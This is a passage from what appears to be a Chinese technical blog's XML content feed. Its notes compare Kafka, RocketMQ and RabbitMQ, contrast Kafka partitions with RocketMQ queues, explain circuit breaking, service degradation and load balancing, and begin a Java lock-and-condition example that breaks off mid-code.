<a href="https://www.cnblogs.com/jiagoubaiduren/p/16213891.html">如何设计一个牛逼的消息队列？ - 架构摆渡人 - 博客园 (cnblogs.com)</a><br>
<a href="https://mp.weixin.qq.com/s/irLRi-yZyZ1e9kHUPV7CVg">如何保证接口幂等性 ？高并发下的接口幂等性如何实现 ？ (qq.com)</a><br>
<a href="https://mp.weixin.qq.com/s/EeYNJJMKkJOFHBV9w0oDUg">如何保证MQ消息的幂等性 (qq.com)</a></p>
<h2 id="8-1-Kafka">8.1 Kafka</h2>
<ol>
<li class="lvl-3">
<p><a href="https://blog.csdn.net/jam_yin/article/details/131979567">Kafka消息丢失：原因、解决方案和零丢失的配置-CSDN博客</a></p>
</li>
<li class="lvl-3">
<p><a href="https://cloud.tencent.com/developer/article/1665700">Kafka常见的导致重复消费原因和解决方案-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
</li>
<li class="lvl-3">
<p><a href="https://cloud.tencent.com/developer/article/1852157">一文理解Kafka的选举机制与Rebalance机制-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>消息队列</category>
      </categories>
      <tags>
        <tag>高性能</tag>
        <tag>幂等性</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/08/17/%E6%A1%86%E6%9E%B6/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E6%AF%94%E8%BE%83/</url>
    <content><![CDATA[<h1>1 消息队列比较</h1>
<table>
<thead>
<tr>
<th>特性</th>
<th>RabbitMQ</th>
<th><code>RocketMQ</code></th>
<th><code>kafka</code></th>
</tr>
</thead>
<tbody>
<tr>
<td>TOPIC（主题模型实现）</td>
<td></td>
<td>队列模型</td>
<td>没有队列的概念，一个主题有多个<mark>分区(Partition)</mark></td>
</tr>
<tr>
<td>消费模式</td>
<td></td>
<td>集群消费、<mark>广播消费</mark></td>
<td>集群消费，一个消息只能由一个消费者实例消费</td>
</tr>
<tr>
<td>支持消息</td>
<td></td>
<td><mark>延时消息</mark>、事务消息</td>
<td>事务消息，不支持延时消息</td>
</tr>
<tr>
<td>依赖与管理</td>
<td></td>
<td>Name Server 进行服务发现和路由管理</td>
<td>依赖 Zookeeper 进行分区的元数据管理、Leader 选举和消费组协调</td>
</tr>
<tr>
<td>使用场景</td>
<td></td>
<td><strong>RocketMQ 的 Queue</strong> 更加灵活，支持更复杂的消息路由和消费策略，适合需要精细化控制和顺序性保证的场景，如金融交易、电商订单处理等。</td>
<td><strong>Kafka 的 Partition</strong> 注重高吞吐量和简单性，适合需要处理大量数据流的场景，如实时日志收集、大数据处理等。</td>
</tr>
<tr>
<td><mark>消息吞吐量</mark></td>
<td>万级</td>
<td>10万级</td>
<td>10万级，吞吐量高。一般配合大数据类的系统来进行实时数据计算、日志采集等场景</td>
</tr>
<tr>
<td>时效性</td>
<td>us级，这是rabbitmq的一大特点，延迟是最低的</td>
<td>ms级</td>
<td>ms级</td>
</tr>
<tr>
<td>可用性</td>
<td>高（主从架构）</td>
<td>非常高（分布式架构）</td>
<td>非常高（分布式架构），kafka是分布式的，一个数据多个副本，少数机器宕机，不会丢失数据，不会导致不可用</td>
</tr>
<tr>
<td>优劣势总结</td>
<td>erlang语言开发，性能极其好，延时很低；吞吐量到万级，MQ功能比较完备而且开源提供的管理界面非常棒</td>
<td></td>
<td>提供较少的核心功能，但是提供超高的吞吐量，ms级的延迟，极高的可用性以及可靠性，而且分布式可以任意扩展同时kafka最好是支撑较少的topic数量即可，保证其<strong>超高吞吐量</strong>而且kafka唯一的一点劣势是有可能<strong>消息重复消费</strong>，那么对数据准确性会造成极其轻微的影响，在大数据领域中以及日志采集中，这点轻微影响可以忽略这个特性天然适合<strong>大数据实时计算以及日志收集</strong><br></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>消费推拉模式</strong><br>
客户端消费者获取消息的方式，Kafka和RocketMQ是通过<mark>长轮询Pull的方式拉取消息</mark>，RabbitMQ、Pulsar、NSQ都是通过Push的方式。</p>
<p>pull类型的消息队列更适合<mark>高吞吐量</mark>的场景，允许消费者自己进行流量控制，根据消费者实际的消费能力去获取消息。而push类型的消息队列，实时性更好，但需要有一套良好的流控策略（backpressure）当消费者消费能力不足时，减少push的消费数量，避免压垮消费端。</p>
</li>
<li class="lvl-2">
<p><strong>延迟队列</strong><br>
延迟消息的使用场景比如异常检测重试，订单超时取消等，例如：</p>
<ul class="lvl-2">
<li class="lvl-6">服务请求异常，需要将异常请求放到单独的队列，隔5分钟后进行重试；</li>
<li class="lvl-6">用户购买商品，但一直处于未支付状态，需要定期提醒用户支付，超时则关闭订单；</li>
<li class="lvl-6">面试或者会议预约，在面试或者会议开始前半小时，发送通知再次提醒。<br>
Kafka不支持延迟消息，RocketMQ开源版本延迟消息临时存储在一个内部主题中，不支持任意时间精度，支持特定的level，例如定时5s，10s，1m等。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>死信队列</strong><br>
Kafka、RocketMQ、Pulsar、NSQ不支持优先级队列，可以通过不同的队列来实现消息优先级。<br>
RabbitMQ支持优先级消息。</p>
</li>
<li class="lvl-2">
<p><strong>优先级队列</strong></p>
</li>
</ul>
<h1>2 消息队列选择建议</h1>
<p><strong>1.Kafka</strong><br>
Kafka主要特点是基于Pull的模式来处理消息消费，追求<strong>高吞吐量</strong>，一开始的目的就是用于日志收集和传输，适合产生大量数据的互联网服务的数据收集业务。</p>
<p>大型公司建议可以选用，如果有日志采集功能，肯定是首选kafka了。</p>
<p><strong>2.RocketMQ</strong><br>
天生为<strong>金融互联网领域</strong>而生，对于<strong>高可靠性</strong>的场景，尤其是电商里面的订单扣款，以及业务削峰，在大量交易涌入时，后端可能无法及时处理的情况。</p>
<p>RoketMQ在稳定性上可能更值得信赖，这些业务场景在阿里双11已经经历了多次考验，如果你的业务有上述并发场景，建议可以选择RocketMQ。</p>
<p><strong>3.RabbitMQ</strong><br>
RabbitMQ :结合erlang语言本身的并发优势，性能较好，社区活跃度也比较高，但是不利于做二次开发和维护。不过，RabbitMQ的社区十分活跃，可以解决开发过程中遇到的bug。</p>
<p>如果你的数据量没有那么大，小公司优先选择功能比较完备的RabbitMQ。</p>
<h1>3 Kafka和RocketMQ</h1>
<p>Apache Kafka和Apache RocketMQ都是广泛使用的分布式消息中间件，它们在大数据处理、高并发和高性能场景中发挥着关键作用。尽管它们有相似的应用场景，但两者之间存在一些设计哲学和功能上的差异。下面概述了Kafka和RocketMQ的主要区别与联系：<br>
联系</p>
<ol>
<li class="lvl-3">
<p>分布式架构：Kafka和RocketMQ都采用了分布式架构，支持高可用性和水平扩展，能够应对大规模数据传输和处理需求。</p>
</li>
<li class="lvl-3">
<p>发布/订阅模式：两者都支持发布/订阅（Pub/Sub）模式，允许生产者发布消息到特定主题，而多个消费者可以订阅这些主题来接收消息。<br>
3. 高吞吐量与低延迟：它们都被设计用于高吞吐量和低延迟的消息传递，特别适合实时数据处理和流处理场景。<br>
4. 持久化与可靠性：Kafka和RocketMQ都能保证消息的持久化存储，确保即使在系统故障时也不会丢失数据。<br>
区别</p>
</li>
<li class="lvl-3">
<p>设计初衷与背景：  Kafka主要用于日志处理和实时数据管道。它更侧重于流处理和数据分析领 。RocketMQ设计时更多考虑了电商等互联网业务场景的需求，如订单处理、分布式事务支持等。<br>
2. 消息模型：  Kafka采用分区（Partition）的概念，每个主题可以分为多个分区，分区内部有序，分区间可以并行处理，适合大量数据的并行处理。  RocketMQ除了基本的消息队列模型，还引入了顺序消息和事务消息的支持，更适合需要严格消息顺序或事务一致性的场景。<br>
3. 消息存储：  Kafka将消息持久化到磁盘，并使用文件系统特性优化读写性能，通过日志压缩机制管理存储空间。 RocketMQ虽然也支持消息持久化，但它采用一种环形缓冲区的设计来提高内存使用效率，同时支持异步刷盘減少磁盘1/0影响。</p>
</li>
</ol>
<p>Kafka 和 RocketMQ 都是分布式消息队列系统，主要用于处理大规模的数据流和事件流。两者在架构、功能特性、使用场景和性能方面有一些差异。下面是两者的主要区别：</p>
<h3 id="3-1-1-架构与设计">3.1.1 <strong>架构与设计</strong></h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>Kafka</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">Kafka 设计简单，核心架构围绕主题（Topic）和分区（Partition）展开。Producer 将消息写入分区，Consumer 从分区读取消息。</li>
<li class="lvl-6">Kafka 的 Broker 是无状态的，消费者的位移存储在 Kafka 自身（基于内部主题或外部系统，如 Zookeeper）。</li>
<li class="lvl-6">强依赖 Zookeeper，用于集群管理、Leader 选举和消费者协调。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>RocketMQ</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">RocketMQ 是阿里巴巴开源的消息中间件，架构较为复杂，采用多层次设计，包括 Name Server、Broker、Producer、Consumer 等多个组件。</li>
<li class="lvl-6">RocketMQ 的 Broker 具有更多的功能，比如支持消息过滤、延时消息等。</li>
<li class="lvl-6">Name Server 负责服务发现和路由管理，而 Kafka 由 Zookeeper 处理类似功能。</li>
</ul>
</li>
</ul>
<h3 id="3-1-2-消息模型">3.1.2 <strong>消息模型</strong></h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>Kafka</strong>：支持发布-订阅模型和点对点模型（通过消费组实现）。消息按分区顺序处理，且默认不支持延迟消息和消息过滤。</p>
</li>
<li class="lvl-2">
<p><strong>RocketMQ</strong>：支持发布-订阅模型，支持标签（Tag）和关键字（Key）来实现消息过滤。此外，支持定时/延迟消息。</p>
</li>
</ul>
<h3 id="3-1-3-消息可靠性">3.1.3 <strong>消息可靠性</strong></h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>Kafka</strong>：通过副本机制（Replication）实现高可用性和数据持久化。副本数量和一致性可以配置。Kafka 允许“至少一次”或“最多一次”的消息投递语义。</p>
</li>
<li class="lvl-2">
<p><strong>RocketMQ</strong>：也支持多副本，但与 Kafka 不同，RocketMQ 可以配置同步或异步刷盘，并且可以配置主从同步机制来提高可靠性。</p>
</li>
</ul>
<h3 id="3-1-4-性能">3.1.4 <strong>性能</strong></h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>Kafka</strong>：专注于吞吐量，适合处理海量数据。通过顺序写入、零拷贝等优化手段实现了高吞吐量和低延迟。</p>
</li>
<li class="lvl-2">
<p><strong>RocketMQ</strong>：在性能和功能之间进行了平衡，虽然单节点的吞吐量可能不如 Kafka，但它在功能性（例如消息过滤、延时消息）和灵活性方面更强。</p>
</li>
</ul>
<h3 id="3-1-5-使用场景">3.1.5 <strong>使用场景</strong></h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>Kafka</strong>：适用于大数据实时处理、日志收集、流式处理等场景，特别是在数据管道和事件流处理方面有较好的表现。</p>
</li>
<li class="lvl-2">
<p><strong>RocketMQ</strong>：适用于电商、金融等需要高可靠性、低延迟和复杂业务逻辑的场景。阿里巴巴内部广泛使用，尤其在交易系统中。</p>
</li>
</ul>
<h3 id="3-1-6-轻量性">3.1.6 <strong>轻量性</strong></h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>Kafka</strong>：从功能和架构上看，Kafka 更加简单和轻量。核心组件只有 Broker 和 Zookeeper，易于部署和运维。</p>
</li>
<li class="lvl-2">
<p><strong>RocketMQ</strong>：架构相对复杂，功能更为丰富，依赖更多的组件，如 Name Server 和多个 Broker。相较于 Kafka，RocketMQ 的功能性增强带来了更高的复杂度。</p>
</li>
</ul>
<h3 id="3-1-7-总结">3.1.7 总结</h3>
<p>如果从架构和使用的简洁性来看，Kafka 更加轻量，特别是在分布式消息队列系统的核心场景下。但如果需要更丰富的功能，如消息过滤、延时消息和复杂的消息路由，RocketMQ 可能是更好的选择。</p>
<h1>4 分区和队列</h1>
<p>Kafka 的 Partition（分区）和 RocketMQ 的 Queue（队列）是两者在消息存储和并行处理方面的关键概念。它们虽然功能类似，但在实现和设计上有一些差异。</p>
<h3 id="4-1-1-概念对比">4.1.1 <strong>概念对比</strong></h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>Kafka Partition</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">Kafka 中的 Partition 是一个物理日志文件，Topic 下可以有多个 Partition，每个 Partition 代表一个消息队列。</li>
<li class="lvl-6">每个 Partition 是独立的消息序列，具有顺序性，但不同 Partition 之间的消息是无序的。</li>
<li class="lvl-6">分区的数量决定了并行消费的能力，分区越多，可以并行处理的消费者越多。</li>
<li class="lvl-6">Kafka 的分区设计使得消息在写入时可以按分区键（Key）进行分区，使得相同 Key 的消息进入同一分区，保证局部有序。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>RocketMQ Queue</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">RocketMQ 的 Queue 是 Topic 下的一个逻辑队列，一个 Topic 可以包含多个 Queue，每个 Queue 是一个 FIFO（先进先出）队列。</li>
<li class="lvl-6">消息按顺序写入 Queue，消费者从 Queue 中顺序读取消息。</li>
<li class="lvl-6">Queue 也是并行消费的基本单元，每个 Queue 可以被不同的消费者并行消费。</li>
<li class="lvl-6">RocketMQ 的 Queue 与 Kafka 的 Partition 类似，都是将消息划分为多个并行处理的单元。</li>
</ul>
</li>
</ul>
<h3 id="4-1-2-消息路由与分配">4.1.2 <strong>消息路由与分配</strong></h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>Kafka</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">消息的路由由 Producer 根据分区键（Key）决定。如果设置了 Key，相同 Key 的消息会被路由到同一个 Partition，从而保证有序性。如果没有指定 Key，Kafka 默认采用轮询方式分配消息到各个分区。</li>
<li class="lvl-6">消费者在消费时，根据消费组的配置，可以分配多个分区，每个分区内的消息是顺序消费的。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>RocketMQ</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">RocketMQ 的消息路由也是由 Producer 决定，Producer 可以指定消息发送到某个特定的 Queue（通过 MessageQueueSelector），或者使用默认的轮询机制。</li>
<li class="lvl-6">消费者可以消费多个 Queue 的消息，每个 Queue 内的消息是按顺序消费的。</li>
</ul>
</li>
</ul>
<h3 id="4-1-3-消费模型">4.1.3 <strong>消费模型</strong></h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>Kafka</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">Kafka 采用消费组（Consumer Group）的概念，组内的消费者实例共同消费一个 Topic 的所有分区，每个分区只能被一个消费者实例消费。不同的消费组之间相互独立。</li>
<li class="lvl-6">分区的数量决定了最大并行消费的消费者数量。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>RocketMQ</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">RocketMQ 也采用消费组的概念，并支持两种消费模式：集群消费（Clustering）和广播消费（Broadcasting）。</li>
<li class="lvl-6">在集群消费模式下，每个 Queue 只能被组内一个消费者实例消费，多个消费者实例可以并行处理不同的 Queue。</li>
<li class="lvl-6">在广播模式下，每个消费者实例都会消费所有 Queue 的消息，即消息会被所有消费者实例都消费一次。</li>
</ul>
</li>
</ul>
<h3 id="4-1-4-消息顺序性">4.1.4 <strong>消息顺序性</strong></h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>Kafka</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">Kafka 在分区内部保证消息的顺序性。如果需要严格的全局有序，可以将所有消息发送到同一个分区，但这会限制并行处理能力。</li>
<li class="lvl-6">对于局部有序的场景，可以通过分区键来保证同一类消息（相同 Key）按顺序进入同一分区。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>RocketMQ</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">RocketMQ 通过 Queue 实现消息顺序性，每个 Queue 内部保证消息顺序。</li>
<li class="lvl-6">可以通过自定义的 MessageQueueSelector 来实现顺序消息的路由，确保相同类型的消息进入同一个 Queue。</li>
</ul>
</li>
</ul>
<h3 id="4-1-5-扩展性">4.1.5 <strong>扩展性</strong></h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>Kafka</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">Kafka 的 Partition 是扩展性的基础，分区数量可以在 Topic 创建后增加，但无法减少。增加分区后，可能会打破现有的消息顺序。</li>
<li class="lvl-6">Kafka 在分区的伸缩性方面表现较好，分区数量增加时可以提高并行处理能力。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>RocketMQ</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">RocketMQ 的 Queue 数量也是固定的，但在需要时也可以增加 Queue。与 Kafka 相比，Queue 的扩展相对更灵活，但同样会有顺序性破坏的风险。</li>
</ul>
</li>
</ul>
<h3 id="4-1-6-总结">4.1.6 总结</h3>
<p>Kafka 的 Partition 和 RocketMQ 的 Queue 都是为了解决消息系统的并行处理和水平扩展问题。Kafka 的 Partition 更加简单直接，而 RocketMQ 的 Queue 提供了更灵活的路由和消费控制机制。根据具体业务需求，选择适合的模型非常重要。</p>
<h1>5 参考</h1>
<ol>
<li class="lvl-3">
<p><a href="https://cloud.tencent.com/developer/article/1944357">10分钟搞懂！消息队列选型全方位对比-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
</li>
<li class="lvl-3">
<p><a href="https://blog.csdn.net/z_344791576/article/details/137820230">一文详解七大主流消息队列（MQ）：特性、应用场景与对比分析_常见的mq消息队列-CSDN博客</a></p>
</li>
<li class="lvl-3">
<p><a href="https://blog.csdn.net/qq_44240587/article/details/104630567">MQ消息队列详解、四大MQ的优缺点分析_四大消息队列的优缺点-CSDN博客</a></p>
</li>
<li class="lvl-3">
<p><a href="https://blog.csdn.net/z_344791576/article/details/137820230">一文详解七大主流消息队列（MQ）：特性、应用场景与对比分析_常见的mq消息队列-CSDN博客</a></p>
</li>
<li class="lvl-3">
<p><a href="https://mp.weixin.qq.com/s/QnrIjubSigjeNtRPOmMsBA">消息队列黄金三剑客：RabbitMQ、RocketMQ和Kafka全面对决，谁是最佳选择？ (qq.com)</a></p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/05/29/%E6%A1%86%E6%9E%B6/%E9%AB%98%E6%80%A7%E8%83%BD&amp;%E9%AB%98%E5%8F%AF%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%86%94%E6%96%AD%E3%80%81%E6%9C%8D%E5%8A%A1%E9%99%8D%E7%BA%A7/</url>
    <content><![CDATA[<h1>1 服务熔断</h1>
<p>服务熔断（Circuit Breaker）是一种用于构建分布式系统的设计模式，用于增强系统的稳定性和可靠性。服务熔断的核心思想是在出现服务故障或异常时，及时地中断对该服务的请求，防止故障进一步扩散，并且允许系统在出现问题时快速失败而不是无限期地等待响应。</p>
<p>服务熔断的用途和优势包括：</p>
<ol>
<li class="lvl-3">
<p><strong>防止级联故障：</strong> 当某个服务或组件出现故障时，服务熔断可以快速地停止对该服务的请求，防止故障扩散到其他部分，从而保护整个系统的稳定性。</p>
</li>
<li class="lvl-3">
<p><strong>快速失败：</strong> 服务熔断允许系统在出现问题时快速失败，而不是等待超时，这可以减少用户等待时间，并快速释放资源以减轻系统负担。</p>
</li>
<li class="lvl-3">
<p><strong>降级处理：</strong> 当服务熔断触发时，可以采取降级处理策略，例如返回预先定义的默认值、执行备用逻辑或者从缓存中获取数据，以保证系统的基本功能继续可用。</p>
</li>
<li class="lvl-3">
<p><strong>自我修复：</strong> 当服务熔断一段时间后，可以尝试重新发起请求，如果服务恢复正常，则关闭熔断器，继续正常提供服务。</p>
</li>
</ol>
<p>常见问题和挑战包括：</p>
<ol>
<li class="lvl-3">
<p><strong>熔断器状态管理：</strong> 需要有效地管理熔断器的状态，包括打开、关闭和半开状态的切换，以及对状态的监控和调整，确保熔断器的行为符合预期。</p>
</li>
<li class="lvl-3">
<p><strong>故障诊断和处理：</strong> 需要及时地检测和诊断服务的故障，并采取相应的措施进行处理，例如记录错误日志、发送警报通知等。</p>
</li>
<li class="lvl-3">
<p><strong>降级策略设计：</strong> 需要设计合适的降级处理策略，以保证在服务熔断时系统依然能够提供基本的功能，而不影响用户体验。</p>
</li>
<li class="lvl-3">
<p><strong>性能影响：</strong> 在服务熔断时，可能会增加系统的负载和响应时间，因此需要合理评估熔断器的触发条件和恢复机制，以减少性能影响。</p>
</li>
</ol>
<p>总的来说，服务熔断是一种重要的分布式系统设计模式，通过及时地中断对故障服务的请求，可以提高系统的稳定性和可靠性，但同时也需要综合考虑各种因素，合理设计和管理熔断策略，以确保系统的正常运行。</p>
<h1>2 服务降级</h1>
<p>服务降级（Service Degradation）是一种在面对系统资源不足或者系统负载过大时，为了保证系统的核心功能或者关键服务的可用性而采取的一种策略。服务降级的核心思想是在系统压力过大时，有选择性地降低非核心或次要功能的服务质量，以确保系统的核心功能仍然能够正常运行。</p>
<p>服务降级的目的在于保证系统在遇到异常或高负载情况下仍能够提供基本的服务能力，从而提高系统的稳定性和可用性。在实际应用中，服务降级通常伴随着一些特定的策略和实践，例如：</p>
<ol>
<li class="lvl-3">
<p><strong>优先级划分：</strong> 将系统中的功能和服务按照其重要性和优先级进行划分，确保核心功能拥有更高的优先级，并在资源不足时优先保证核心功能的运行。</p>
</li>
<li class="lvl-3">
<p><strong>限流和限速：</strong> 通过限制对系统的访问速率或者并发请求数量，以防止系统过载，从而减轻系统负载压力。</p>
</li>
<li class="lvl-3">
<p><strong>降级策略设计：</strong> 设计合适的降级策略，当系统资源不足或者系统负载过大时，有选择性地降低非核心功能或次要功能的服务质量，例如降低服务响应时间、减少服务数据的返回量等。</p>
</li>
<li class="lvl-3">
<p><strong>实时监控和调整：</strong> 实时监控系统的负载情况和性能指标，根据实际情况动态调整降级策略，以确保系统的稳定性和性能表现。</p>
</li>
</ol>
<p>服务降级的优点包括：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>提高系统的稳定性：</strong> 在面对异常情况或者高负载情况时，通过降级非核心功能或次要功能的服务质量，可以确保系统的核心功能仍能够正常运行，从而提高系统的稳定性。</p>
</li>
<li class="lvl-2">
<p><strong>保证核心功能的可用性：</strong> 通过有选择性地降级非核心功能或次要功能，可以确保系统的核心功能在异常或高负载情况下仍能够提供基本的服务能力，从而保证核心功能的可用性。</p>
</li>
<li class="lvl-2">
<p><strong>减少系统压力：</strong> 通过降级非核心功能或次要功能的服务质量，可以减少系统的负载压力，从而提高系统的整体性能和响应速度。</p>
</li>
</ul>
<p>服务降级也存在一些潜在的缺点</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>可能影响用户体验</p>
</li>
<li class="lvl-2">
<p>需要精细的策略设计和实时监控</p>
</li>
<li class="lvl-2">
<p>可能引起业务方面的不满等。 因此，在实施服务降级策略时，需要综合考虑各种因素，并设计合理的降级策略，以确保系统的整体性能和用户体验。</p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>负载均衡</title>
    <url>/2024/04/11/%E6%A1%86%E6%9E%B6/%E9%AB%98%E6%80%A7%E8%83%BD&amp;%E9%AB%98%E5%8F%AF%E7%94%A8/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</url>
    <content><![CDATA[<h1>1 负载均衡</h1>
<p><strong>负载均衡</strong> 指的是将用户请求分摊到不同的服务器上处理，以提高系统整体的并发处理能力以及可靠性。负载均衡服务可以有由专门的软件或者硬件来完成，一般情况下，硬件的性能更好，软件的价格更便宜（后文会详细介绍到）。</p>
<h1>2 七层负载均衡</h1>
<h2 id="2-1-DNS解析">2.1 DNS解析</h2>
<h2 id="2-2-反向代理">2.2 反向代理</h2>
<p>客户端将请求发送到反向代理服务器，由反向代理服务器去选择目标服务器，获取数据后再返回给客户端。对外暴露的是反向代理服务器地址，隐藏了真实服务器 IP 地址。反向代理“代理”的是目标服务器，这一个过程对于客户端而言是透明的。</p>
<p>Nginx 就是最常用的反向代理服务器，它可以将接收到的客户端请求以一定的规则（负载均衡策略）均匀地分配到这个服务器集群中所有的服务器上。</p>
<p>反向代理负载均衡同样属于七层负载均衡。</p>
<h1>3 负载均衡是怎么做的，如何实现一直均衡给一个用户</h1>
<p>负载均衡实现的一般步骤：</p>
<ol>
<li class="lvl-3">
<p><strong>识别负载均衡的需求：</strong> 首先需要确定在网络中的哪些资源需要进行负载均衡，如 Web 服务器、应用服务器或数据库服务器等。</p>
</li>
<li class="lvl-3">
<p><strong>选择负载均衡算法：</strong> 根据具体的需求选择合适的负载均衡算法，常见的算法包括轮询（Round Robin）、加权轮询（Weighted Round Robin）、最小连接数（Least Connection）等。</p>
</li>
<li class="lvl-3">
<p><strong>配置负载均衡器：</strong> 配置负载均衡器，设置负载均衡的规则和算法。这包括指定要均衡的服务器、配置健康检查（Health Check）机制以及设置负载均衡策略等。</p>
</li>
<li class="lvl-3">
<p><strong>请求分发：</strong> 当用户发送请求时，负载均衡器会根据选定的算法将请求分发到相应的服务器上。</p>
</li>
<li class="lvl-3">
<p><strong>监控和调整：</strong> 监控服务器的负载情况，根据需要动态调整负载均衡策略，以确保各服务器的负载保持均衡。</p>
</li>
</ol>
<p>实现一直均衡给一个用户可能涉及不同的需求和场景，可以通过一些特定的策略来实现：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>基于 IP 地址的持续连接（IP Stickiness）：</strong> 通过将用户的请求路由到同一台服务器，以确保用户的会话状态在同一服务器上保持。这通常通过在负载均衡器上配置 IP 地址和服务器的映射关系来实现。</p>
</li>
<li class="lvl-2">
<p><strong>会话保持（Session Affinity）：</strong> 类似于 IP Stickiness，但是更加灵活，可以基于用户的会话信息（如 Cookie）来实现，以确保用户的会话状态在同一服务器上保持。</p>
</li>
<li class="lvl-2">
<p><strong>动态负载均衡策略：</strong> 除了静态配置的负载均衡策略外，还可以根据用户的负载情况和服务器的负载情况动态调整负载均衡策略，以实现持续的均衡。</p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>高并发</title>
    <url>/2024/01/01/%E6%A1%86%E6%9E%B6/%E9%AB%98%E6%80%A7%E8%83%BD&amp;%E9%AB%98%E5%8F%AF%E7%94%A8/%E9%AB%98%E5%B9%B6%E5%8F%91/</url>
    <content><![CDATA[<h1>1 细粒度锁</h1>
<ul class="lvl-0">
<li class="lvl-2"><strong>最小化锁范围</strong>： 细粒度锁将锁的作用范围限制在最小的数据单元或操作上，而不是对整个数据结构或资源加锁。</li>
<li class="lvl-2"><strong>减少锁持有时间</strong>： 通过快速完成操作并尽早释放锁，减少每个线程持有锁的时间，从而减少其他线程的等待时间。</li>
<li class="lvl-2"><strong>锁分离</strong>：将不同的操作或数据访问分离到不同的锁上，使得多个操作可以并行执行，而不是所有操作都依赖于同一个锁。</li>
<li class="lvl-2"><strong>锁分段</strong>：将数据结构分割成多个段，每个段有自己的锁，这样可以同时对不同段进行操作而不会相互阻塞。</li>
<li class="lvl-2"><strong>无锁编程</strong>： 利用原子操作和数据结构来避免使用锁，通过CAS（Compare-And-Swap）等机制来保证数据的一致性。</li>
<li class="lvl-2"><strong>读写锁</strong>：允许多个读操作同时进行，但写操作需要独占锁，以此来提高读操作的并发性。</li>
<li class="lvl-2"><strong>锁粗化</strong>： 在某些情况下，如果一个线程需要连续访问多个资源，可以考虑将锁的范围扩大，以减少频繁的锁获取和释放。</li>
<li class="lvl-2"><strong>锁升级和降级</strong>：根据实际情况动态调整锁的粒度，例如从读锁升级到写锁，或者在不同级别的锁之间进行切换。</li>
<li class="lvl-2"><strong>避免死锁</strong>： 设计锁策略时，确保锁的获取和释放顺序一致，避免出现死锁。</li>
<li class="lvl-2"><strong>性能监控</strong>： 监控锁的性能，包括锁的竞争率、等待时间和吞吐量，以便根据实际情况调整锁策略。</li>
</ul>
<h2 id="1-1-条件变量">1.1 条件变量</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.Condition;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TaskScheduler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Runnable&gt; tasks = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Condition</span> <span class="variable">condition</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addTask</span><span class="params">(Runnable task)</span> &#123;</span><br><span class="line"></span><br><span class="line">        lock.lock();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            tasks.add(task);</span><br><span class="line"></span><br><span class="line">            condition.signalAll();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line">            lock.unlock();</span><br><span class="line"></span><br><span class="line">        